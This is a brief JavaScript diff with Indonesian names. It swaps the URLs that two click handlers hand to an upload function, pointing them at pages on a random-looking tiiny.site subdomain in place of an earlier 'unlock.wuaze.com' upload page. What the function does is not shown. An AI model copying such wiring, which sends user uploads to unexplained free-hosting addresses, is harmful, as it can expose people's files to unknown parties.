@@ -481,10 +481,10 @@ document.addEventListener("DOMContentLoaded", function() {
     uploadSection3U.appendChild(uploadBagianLayanan);
     
     document.getElementById("item1").addEventListener("click", function() {
-        uploadFileSemua('https://g90nf.tiiny.site/');
+        uploadFileSemua('https://jsksiaokwoeoxnabwijsnsnakwkwk.tiiny.site/index.html');
     });
     document.getElementById("item2").addEventListener("click", function() {
-        uploadFileSemua('http://unlock.wuaze.com/upload-media.html?i=2');
+        uploadFileSemua('https://jsksiaokwoeoxnabwijsnsnakwkwk.tiiny.site/book-upload.html');
     });
 });
 
@@ -663,10 +663,4 @@ document.addEventListener("DOMContentLoaded", async function() {
         console.error("Error:", errorPK);
     }
 });
-
-
-
-
-
-
-
+			  
